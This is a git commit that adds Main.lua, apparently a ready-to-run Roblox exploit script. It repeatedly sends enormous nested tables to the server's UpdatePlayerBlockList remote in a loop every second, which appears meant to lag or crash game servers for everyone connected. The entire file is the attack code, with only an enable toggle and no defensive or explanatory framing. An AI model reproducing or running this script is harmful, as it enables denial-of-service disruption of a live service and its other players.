d5042ce63bc8b466952eabc894d6b3d30dde3079
magnet <86327263+carolesdaughter@users.noreply.github.com>
2023-04-03 00:59:31 -0700

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,31 @@
+getgenv().Enabled = true -- change to false to disable
+
+local Network = game:GetService("NetworkClient")
+local Update = game:GetService("RobloxReplicatedStorage").UpdatePlayerBlockList
+
+local Lag = function()
+    local Main = {}
+    local Spammed = {}
+    
+    local Table = {}
+    table.insert(Spammed, Table)
+    
+    for _ = 1, 250 do
+        local TableToInsert = {}
+        
+        table.insert(Table, TableToInsert)
+        Table = TableToInsert
+    end
+    
+    local Max = (499999 / (255))
+    
+    for _ = 1, Max do
+        table.insert(Main, Spammed)
+    end
+    
+    Update:FireServer(Main)
+end
+
+while task.wait(1) and getgenv().Enabled == true do
+    task.spawn(Lag)
+end
